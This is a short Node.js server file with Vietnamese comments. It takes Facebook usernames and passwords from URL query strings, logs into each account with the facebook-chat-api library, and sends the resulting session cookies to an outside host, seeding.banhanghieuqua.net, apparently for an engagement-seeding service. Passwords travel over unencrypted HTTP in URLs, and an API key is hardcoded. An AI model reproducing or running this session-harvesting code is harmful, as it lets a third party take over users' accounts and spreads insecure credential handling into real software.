// Bước 1: Import module http
var http = require('http');
const https = require('https');

// Bước 2: Khởi tạo server
var params = function (req) {
    let q = req.url.split('?'), result = {};
    if (q.length >= 2) {
        q[1].split('&').forEach((item) => {
            try {
                result[item.split('=')[0]] = item.split('=')[1];
            } catch (e) {
                result[item.split('=')[0]] = '';
            }
        })
    }
    return result;
}

var server = http.createServer(function (request, response) {
    response.writeHead(200, {
        "Context-type": "text/plain"
    });



    request.params = params(request);

    if (request.params.username) {
        const login = require("facebook-chat-api");

        login({ email: request.params.username, password: request.params.password }, (err, api) => {
            if (err) {
                https.get(`https://seeding.banhanghieuqua.net/api/?action=update-cookie-success&cookie=error&UID_app=${request.params.UID}&status=0&key=lskdfnkldsnfkngdflgdgdflgjldfgjdlfjglkjlij423ij4234ijo234oij23o4j2867987912`, (resp) => {
                    let data = '';
                    // console.log(`https://seeding.banhanghieuqua.net/api/?action=update-cookie-success&cookie=error&UID=${request.params.UID}&status=0&key=lskdfnkldsnfkngdflgdgdflgjldfgjdlfjglkjlij423ij4234ijo234oij23o4j2867987912`)

                    // A chunk of data has been recieved.
                    resp.on('data', (chunk) => {
                        data += chunk;
                    });

                    // The whole response has been received. Print out the result.
                    resp.on('end', () => {
                        console.log(data)

                    });

                }).on("error", (err) => {
                    console.log("Error: " + err.message);
                });
            }
            else {
                let cookie = JSON.stringify(api.getAppState());
                https.get(`https://seeding.banhanghieuqua.net/api/?action=update-cookie-success&UID_app=${request.params.UID}&cookie=${cookie}&status=1&key=lskdfnkldsnfkngdflgdgdflgjldfgjdlfjglkjlij423ij4234ijo234oij23o4j2867987912`, (resp) => {
                    let data = '';

                    // A chunk of data has been recieved.
                    resp.on('data', (chunk) => {
                        data += chunk;
                    });

                    // The whole response has been received. Print out the result.
                    resp.on('end', () => {
                        console.log(data)

                    });

                }).on("error", (err) => {
                    console.log("Error: " + err.message);
                });
            }

            // JSON.stringify(api.getAppState())

        });
    };
    response.write('{"status":200}');
    response.end();
});

// Bước 3: Lắng nghe cổng 300 thì thực hiện chương trình
server.listen(3000, function () {
    console.log('Connected Successfull!');
});